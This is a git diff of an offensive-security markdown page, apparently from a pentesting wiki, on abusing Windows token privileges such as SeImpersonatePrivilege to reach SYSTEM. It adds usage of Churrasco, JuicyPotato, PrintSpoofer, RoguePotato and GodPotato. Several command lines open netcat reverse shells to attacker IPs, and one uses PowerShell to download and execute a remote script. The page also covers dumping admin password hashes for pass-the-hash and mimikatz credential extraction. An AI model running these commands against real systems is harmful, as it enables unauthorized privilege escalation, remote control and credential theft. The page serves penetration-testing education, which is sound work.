@@ -21,6 +21,7 @@ There are two types of tokens available:
     The client can choose the maximum impersonation level (if any) available to the server as a connection parameter. Delegation and impersonation are privileged operations (impersonation initially was not, but historical carelessness in the implementation of client APIs failing to restrict the default level to "identification", letting an unprivileged server impersonate an unwilling privileged client, called for it). **Impersonation tokens can only be associated to threads**, and they represent a client process's security subject. Impersonation tokens are usually created and associated to the current thread implicitly, by IPC mechanisms such as DCE RPC, DDE and named pipes.
 
 ## Practice
+
 ### Check privileges
 
 ```
@@ -43,27 +44,75 @@ whoami /priv
 Any process holding this privilege can **impersonate** (but not create) any **token** for which it is able to gethandle. You can get a **privileged token** from a **Windows service** (DCOM) making it perform an **NTLM authentication** against the exploit, then execute a process as **SYSTEM**. Exploit it with [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM ](https://github.com/antonioCoco/RogueWinRM)(needs winrm disabled), [SweetPotato](https://github.com/CCob/SweetPotato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
 
 {% tabs %}
+{% tab title="Churrasco" %}
+[Churrasco](https://github.com/Re4son/Churrasco), Allow us to leverage the SeImpersonatePrivilege on older versions of Windows
+
+{% hint style="danger" %}
+Churrasco will works on **Windows XP/VISTA/2003/2008, Win Server 2003**
+{% endhint %}
+
+```powershell
+c:\Users\Public> .\churrasco.exe -d "nc.exe -e cmd.exe IP PORT"
+```
+{% endtab %}
+
 {% tab title="Juicy-Potato" %}
 [JuicyPotato](https://github.com/ohpe/juicy-potato), a sugared version of RottenPotatoNG. It leverages several COM servers identified by this [list of CLSID](http://ohpe.it/juicy-potato/CLSID/)
+
 {% hint style="danger" %}
-JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer),[RoguePotato](https://github.com/antonioCoco/RoguePotato), [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM
+JuicyPotato **doesn't work** on **Windows Server 2019** and **Windows 10 build 1809 onwards**. However, [PrintSpoofer](https://github.com/itm4n/PrintSpoofer),[RoguePotato](https://github.com/antonioCoco/RoguePotato), [SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato) can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM
+
+Will works on **Windows 7,8,10, Server 2008 R2, Server 2012, Server 2016**
 {% endhint %}
+
 ```bash
 #nc.exe reverse shell
-c:\Users\Public>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
+c:\Users\Public>.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
 
 #Powershell reverse shell
-c:\Users\Public>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
-```  
+c:\Users\Public>.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
+```
+{% endtab %}
+
+{% tab title="PrintSpoofer" %}
+[PrintSpoofer](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0), allow us to abuse Impersonation Privileges on Windows 10 and Server 2019
+
+{% hint style="danger" %}
+PrintSpoofer will works on **Win10, Server 2016, Server 2019**
+{% endhint %}
+
+```powershell
+# -i : interactive
+# -c : command to run
+c:\Users\Public> .\PrintSpoofer.exe -i -c cmd.exe
+c:\Users\Public> .\PrintSpoofer.exe -c "nc.exe IP PORT -e cmd.exe"
+```
+{% endtab %}
+
+{% tab title="RoguePotato" %}
+[RoguePotato](https://github.com/antonioCoco/RoguePotato), is an other tools that allow us to abuse Impersonation Privileges&#x20;
+
+{% hint style="danger" %}
+RoguePotato will works on machine **>= Windows 10 1809 & Windows Server 2019**
+{% endhint %}
+
+```powershell
+# socat redirector for OXID resolving, must use 135
+$ socat tcp-listen:135,reuseaddr,fork tcp:KALI_IP:9999
+c:\Users\Public> .\RoguePotato.exe -r KALI_IP -e "PATH\nc.exe IP PORT -e cmd.exe" -l 9999
+```
 {% endtab %}
 
 {% tab title="GodPotato" %}
 Based on the history of Potato privilege escalation for 6 years, from the beginning of RottenPotato to the end of JuicyPotatoNG, I discovered a new technology by researching DCOM, which enables privilege escalation in Windows 2012 - Windows 2022, now as long as you have "ImpersonatePrivilege" permission. Then you are "NT AUTHORITY\SYSTEM", usually WEB services and database services have "ImpersonatePrivilege" permissions. - [GodPotato](https://github.com/BeichenDream/GodPotato)
 
+{% hint style="danger" %}
+GodPotato will works on **Windows 2012 - Windows 2022 servers**
+{% endhint %}
+
 ```bash
 GodPotato -cmd "cmd /c whoami"
 ```
-
 {% endtab %}
 {% endtabs %}
 
@@ -73,12 +122,11 @@ It is very similar to **SeImpersonatePrivilege**, it will use the **same method*
 Then, this privilege allows **to assign a primary token** to a new/suspended process. With the privileged impersonation token you can derivate a primary token (DuplicateTokenEx).\
 With the token, you can create a **new process** with 'CreateProcessAsUser' or create a process suspended and **set the token** (in general, you cannot modify the primary token of a running process).
 
-
 ### SeTcbPrivilege
 
 If you have enabled this token you can use **KERB\_S4U\_LOGON** to get an **impersonation token** for any other user without knowing the credentials, **add an arbitrary group** (admins) to the token, set the **integrity level** of the token to "**medium**", and assign this token to the **current thread** (SetThreadToken).
 
-### SeBackupPrivilege 
+### SeBackupPrivilege
 
 This privilege causes the system to **grant all read access** control to any file (only read).\
 Use it to **read the password hashes of local Administrator** accounts from the registry and then use "**psexec**" or "**wmicexec**" with the hash (PTH).\
@@ -105,7 +153,7 @@ In this case, the user could **create an impersonation token** and add to it a p
 **Load and unload device drivers.**\
 You need to create an entry in the registry with values for ImagePath and Type.\
 As you don't have access to write to HKLM, you have to **use HKCU**. But HKCU doesn't mean anything for the kernel, the way to guide the kernel here and use the expected path for a driver config is to use the path: "\Registry\User\S-1-5-21-582075628-3447520101-2530640108-1003\System\CurrentControlSet\Services\DriverName" (the ID is the **RID** of the current user).\
-So, you have to **create all that path inside HKCU and set the ImagePath** (path to the binary that is going to be executed) **and Type** (SERVICE\_KERNEL\_DRIVER 0x00000001).\
+So, you have to **create all that path inside HKCU and set the ImagePath** (path to the binary that is going to be executed) **and Type** (SERVICE\_KERNEL\_DRIVER 0x00000001).\\
 
 {% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege" %}
 
@@ -153,8 +201,8 @@ mimikatz # sekurlsa::logonpasswords
 
 If you want to get a `NT SYSTEM` shell you could use:
 
-* ****[**SeDebugPrivilegePoC**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)****
-* ****[**psgetsys.ps1**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)****
+* [**SeDebugPrivilegePoC**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
+* [**psgetsys.ps1**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
 
 ```powershell
 # Get the PID of a process running as NT SYSTEM
